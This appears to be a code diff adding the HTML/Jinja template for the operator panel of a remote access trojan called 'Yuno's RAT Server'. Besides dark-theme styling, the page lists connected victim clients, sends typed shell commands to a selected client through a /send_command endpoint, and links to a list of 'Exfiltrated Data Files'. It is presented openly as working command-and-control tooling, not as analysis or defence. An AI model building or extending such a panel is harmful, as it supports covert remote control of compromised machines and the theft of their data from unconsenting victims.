@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Yuno's RAT Server</title>
+    <style>
+        body {
+            font-family: monospace;
+            background-color: #1C2526;
+            color: #00FF00;
+            padding: 20px;
+        }
+        h1 {
+            color: #A100FF;
+        }
+        .section {
+            margin-bottom: 20px;
+        }
+        .client-list, .data-files {
+            list-style: none;
+            padding: 0;
+        }
+        .client-list li, .data-files li {
+            margin-bottom: 10px;
+        }
+        .client-list li {
+            color: #00FF00;
+        }
+        .data-files li a {
+            color: #A100FF;
+            text-decoration: none;
+        }
+        .data-files li a:hover {
+            text-decoration: underline;
+        }
+        form {
+            margin-top: 10px;
+        }
+        input[type="text"], select {
+            background-color: #333638;
+            color: #00FF00;
+            border: 1px solid #00FF00;
+            padding: 5px;
+            font-family: monospace;
+        }
+        button {
+            background-color: #00FF00;
+            color: #000000;
+            border: none;
+            padding: 5px 10px;
+            cursor: pointer;
+            font-family: monospace;
+        }
+        button:hover {
+            background-color: #A100FF;
+            color: #FFFFFF;
+        }
+        #result {
+            margin-top: 10px;
+            color: #FFFFFF;
+        }
+    </style>
+</head>
+<body>
+    <h1>Yuno's RAT Server</h1>
+    <div class="section">
+        <h2>Connected Clients</h2>
+        <ul class="client-list">
+            {% if clients %}
+                {% for client in clients %}
+                    <li>{{ client }}</li>
+                {% endfor %}
+            {% else %}
+                <li>No clients connected</li>
+            {% endif %}
+        </ul>
+    </div>
+    <div class="section">
+        <h2>Send Command</h2>
+        <form id="command-form">
+            <select name="client_id" id="client-id">
+                <option value="">Select a client</option>
+                {% for client in clients %}
+                    <option value="{{ client }}">{{ client }}</option>
+                {% endfor %}
+            </select>
+            <input type="text" name="command" id="command" placeholder="Enter command (e.g., dir)" required>
+            <button type="submit">Send</button>
+        </form>
+        <div id="result"></div>
+    </div>
+    <div class="section">
+        <h2>Exfiltrated Data Files</h2>
+        <ul class="data-files">
+            {% if files %}
+                {% for file in files %}
+                    <li><a href="{{ url_for('view_file', filename=file) }}">{{ file }}</a></li>
+                {% endfor %}
+            {% else %}
+                <li>No data files available</li>
+            {% endif %}
+        </ul>
+    </div>
+    <script>
+        document.getElementById('command-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const formData = new FormData(e.target);
+            const response = await fetch('/send_command', {
+                method: 'POST',
+                body: formData
+            });
+            const result = await response.json();
+            const resultDiv = document.getElementById('result');
+            resultDiv.textContent = result.message;
+            resultDiv.style.color = result.success ? '#00FF00' : '#FF0000';
+        });
+    </script>
+</body>
+</html>
